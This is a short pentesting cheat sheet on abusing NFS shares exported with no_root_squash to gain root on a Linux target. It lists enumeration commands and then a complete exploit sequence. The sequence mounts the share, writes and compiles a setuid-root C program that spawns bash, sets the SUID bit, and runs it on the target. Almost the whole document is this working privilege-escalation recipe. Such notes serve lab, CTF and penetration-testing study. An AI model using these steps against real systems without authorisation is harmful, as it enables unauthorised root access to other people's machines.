# NFS Root Squashing

- Root squash is a special mapping that maps root (uid 0) to local "nobody" user (uid 65534) which has minimal privileges.

1. Mount the target from target to local
2. Create privesc exploit as SUID bit to the bash shell file on local 
3. Execute privesc exploit on the target

## Enumerate

Verify in `exports` file has `no_root_squash` turned on on the target file path
```
cat /etc/exports
```

Verify the target directory is mountable.
```
showmount -e <ip>
```

## Exploitation

Create a local directory
```
mkdir /tmp/mnt
```

Mount the target directory to local
```
mount -t nfs <target_ip>:<target_directory> /tmp/mnt
```

Prepare the privesc code `x.c`
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mnt/x.c
```

Complie it
```
gcc /tmp/mnt/x.c -o /tmp/mnt/x
```

Set SUID bit
```
chmod +s /tmp/mnt/x
```

Run file on the target machine
```
./x
```

